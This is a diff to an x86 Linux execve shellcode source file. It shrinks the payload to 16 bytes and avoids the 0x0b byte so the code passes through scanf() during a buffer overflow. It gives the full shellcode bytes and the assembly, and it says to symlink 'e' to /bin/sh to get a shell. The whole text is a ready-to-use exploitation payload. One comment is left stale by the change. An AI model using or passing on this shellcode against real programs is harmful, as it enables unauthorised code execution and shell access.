@@ -4,13 +4,16 @@
 
 ; Use objdump or some other tool to extract shellcode from sc binary!
 
-; /bin//sh execve shellcode by @Pink_P4nther.
+; 'e' execve shellcode by @Pink_P4nther.
 ; The point of this shellcode is to bypass when 0x0b (11) is a bad byte.
 ; This helped when giving overflow input to scanf() for example.
 ; scanf() sees 0x0b as white space therefore ending the read from STDIN.
-; 24 bytes.
+; I also made it as small as possible so the executable name is now 'e'
+; make sure to create a link to whatever you want to execute and name the link 'e'
+; For example: `ln -s /bin/sh e` <- For a shell
+; 16 bytes.
 
-; sc = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x31\xc9\xb0\x0e\x2c\x03\xcd\x80"
+; sc = ("\x31\xc0\x50\x6a\x65\x89\xe3\x99\x31\xc9\x04\x0e\x2c\x03\xcd\x80")
 
 section .text
 
@@ -19,11 +22,10 @@ global _start
 _start:
 	xor eax,eax     ; Zero eax
 	push eax        ; Put 0 on the stack
-	push 0x68732f2f ; Push //sh on the stack
-	push 0x6e69622f ; Push /bin on the stack
+	push 0x65	; Put 'e' on the stack
 	mov ebx,esp     ; Move /bin//sh into ebx
 	cdq             ; Zero edx
 	xor ecx,ecx     ; Zero ecx
-	mov al,0xe      ; Move 0xe into al register (closest ascii code to 0xb thats not whitespace)
-	sub al,0x3      ; Subtract from eax to create 0xb
+	add al,0xe      ; Add 14 eax
+	sub al,0x3	; Subtract 3 from eax to put 0xb (11) in eax
 	int 0x80        ; Software interrupt for system call
